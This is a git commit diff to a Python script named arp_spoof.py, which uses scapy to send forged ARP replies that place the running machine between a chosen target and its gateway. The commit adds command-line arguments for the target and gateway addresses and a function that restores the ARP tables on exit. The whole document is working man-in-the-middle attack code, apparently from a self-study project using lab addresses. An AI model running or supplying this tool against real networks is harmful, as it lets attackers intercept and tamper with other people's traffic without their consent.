3a3d016d9aa3ac7df95692d643ab0632a22d3fe8
abishek982001 <abishek982001@gmail.com>
2020-04-03 03:19:54 -0400

    added restoring function

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,6 +2,15 @@
 
 import scapy.all as scapy
 import time
+import argparse
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP/ IP range")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP")
+    options = parser.parse_args()
+    return options
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -16,13 +25,25 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # packet to fool the target that this  machine is the router
     scapy.send(packet, verbose=False)
 
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+# main function
+options = get_arguments()
 sent_packets_count = 0
 try:
     while True:
-        spoof("10.0.2.15","10.0.2.1")  # function call to fool the victim
-        spoof("10.0.2.1","10.0.2.15")  # function call to fool the router
+        spoof(options.target_ip,options.gateway_ip)  # function call to fool the victim
+        spoof(options.gateway_ip,options.target_ip)  # function call to fool the router
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
         sent_packets_count = sent_packets_count+2
         time.sleep(2)  # time gap of 2 seconds
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ..... Quitting. ")
+    print("\n[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
+    restore(options.target_ip,options.gateway_ip)  # restoring default ARP address in target machine
+    restore(options.gateway_ip,options.target_ip)  # restoring default ARP address in router
